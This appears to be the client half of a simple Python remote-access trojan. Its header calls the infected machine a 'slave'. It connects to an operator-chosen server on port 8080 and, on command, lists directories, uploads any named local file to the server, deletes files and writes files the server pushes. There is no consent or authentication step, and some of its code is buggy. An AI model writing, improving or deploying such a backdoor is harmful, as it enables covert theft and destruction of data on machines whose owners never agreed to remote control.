#Command List :
# dir - show files in directory where the file is running
# cd - Go in Custom Directorys
# dw - Download Files
# rm - removes file
# sendfile - Send A file to a slave

import os
import socket
s = socket.socket()
port = 8080
host = input(str("Enter server address :  "))
s.connect((host,port))
print("~ connected to the server")
print("")

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("Command Recived")
    if (command == "dir"):
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())

        print("Executed!")

    elif command == "cd":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("~ Command Running..")

    elif command == "dw":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data.encode())
        print("")
        print("~ File has Benn Sent!")

    elif command == "rm":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("~ Removed!")
        print("")

    elif command == "sendfile":
        filename = s.recv(6000)
        newfile = open(filename, "wb")
        data = s.recv(6000)
        newfile.write(data)
        newfile.close()

    else:
        print("~ failed Try again..")

